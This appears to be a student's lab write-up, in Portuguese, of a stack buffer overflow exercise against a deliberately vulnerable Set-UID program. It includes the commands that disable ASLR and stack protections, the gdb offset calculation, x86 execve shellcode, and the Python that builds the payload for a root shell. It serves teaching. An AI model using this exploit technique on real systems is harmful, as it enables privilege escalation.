# Buffer Overflow

## Environment Setup

> Numa primeira fase, desligamos algumas das proteções do sistema operativo, como por exemplo a randomização do espaço de endereços e a proibição ao nível da shell de ser executada por processos com Set-UID.
>```bash
> $ sudo sysctl -w kernel.randomize_va_space=0
> $ sudo ln -sf /bin/zsh /bin/sh
>```

## Task 1: Getting Familiar with Shellcode

> Primeiro executamos um programa simples que abre uma shell utilizando o commando `execve`:
> ```c
> char *name[2];
> name[0] = "/bin/sh";
> name[1] = NULL;
> execve(name[0], name, NULL);
> ```
> De seguida, fizemos o mesmo utilizando o shellcode respetivo e invocando-o desde a stack, tanto para 32 bits como para 64 bits. <br><br>
> Em todos os casos, foi aberta uma shell no mesmo diretório em que foi executado o programa.

## Task 2: Understanding the Vulnerable Program

> Inicialmente estudamos o código do programa com uma vulnerabilidade *buffer-overflow*. Reparamos que tenta-se copiar para um buffer de tamanho máximo de 100 bytes, um array de carateres que pode ter até 517 bytes. Como o `strcpy` não verifica os limites do buffer, acaba por ocorrer overflow. <br><br>
> Para o programa vulnerável, desativamos o *StackGuard* e as proteções contra a execução de código invocado desde a stack. Para além disso, mudamos o owner do programa para `root` e ativamos o `Set-UID`
> ```bash
> $ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
> $ sudo chown root stack
> $ sudo chmod 4755 stack
> ```

## Task 3: Launching Attack on 32-bit Program

> Para fazer uso da vulnerabilidade, primeiro criamos o ficheiro `badfile` vazio e executamos o código vulnerável em modo debug, de modo a descobrir a posição do endereço de retorno da função `bof()` relativamente ao inicio do buffer. Para isso usámos `gdb` para fazer debug e colocamos um breakpoint na função `bof()`.
> ```bash
> $ touch badfile # Criar o ficheiro badfile vazio
> $ gdb stack-L1-dbg # Executar o programa em modo debug
> ...
> gdb-peda$ b bof # Criar um breakpoint na função bof
> ...
> gdb-peda$ run # Executar o programa até parar no breakpoint
> ...
> gdb-peda$ next # Avançar algumas intruções até que o registo ebp passe de apontar para a stack frame da função bof(), visto que antes ainda apontava para a stack frame da função que chamou bof()
> ...
> gdb-peda$ p $ebp # Obter o valor de ebp
> $1 = (void *) 0xffffca98
> gdb-peda$ p &buffer # Obter o endereço do início do buffer
> $2 = (char (*)[100]) 0xffffca2c
> ```
> Após obter os endereços necessários, falta inserir no ficheiro `badfile` o conteúdo que pretendemos inserir no buffer (shellcode e o endereço de retorno que aponta para esse shellcode). Para isto usamos o programa fornecido em python, com as seguintes alterações <br> <br>
> Na variável `shellcode` inserimos o shellcode em 32-bits que executa uma shell
> ```python
> shellcode= (
>  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
>  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
>  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
> ).encode('latin-1')
> ```
> Criou-se uma array de bytes de tamanho 517 (tamanho máximo da array de carateres lida do ficheiro pelo programa vulnerável), em que todos os bytes são NOP (0x90)
> ```python
> content = bytearray(0x90 for i in range(517))
> ```
> Colocou-se o shellcode no final da array de bytes
> ```py
> start = 517-len(shellcode)  
> content[start:start + len(shellcode)] = shellcode
> ```
> Calculou-se o novo endereço de retorno que aponta para o shell code a executar
> ```py
> ret    = 0xffffca98 + start 
> ```
> Utilizando os 2 endereços obtidos no debug, calculou-se a localização do endereço de retorno relativamente ao inicio do array (offset) e colocou-se o novo endereço de retorno que aponta para o shellcode calculado anteriormente (ret)
> ```py
> offset = 0xffffca98 - 0xffffca2c + 4 
> L = 4  
> content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
> ```
> Executou-se o programa e este gerou o ficheiro `badfile`. <br><br>
> Finalmente, executou-se o programa vulnerável que provocou o buffer overflow e lançou uma shell com permissões root, tal como previsto. <br> <br>
> ![Buffer Overflow](../img/lab5task3.png)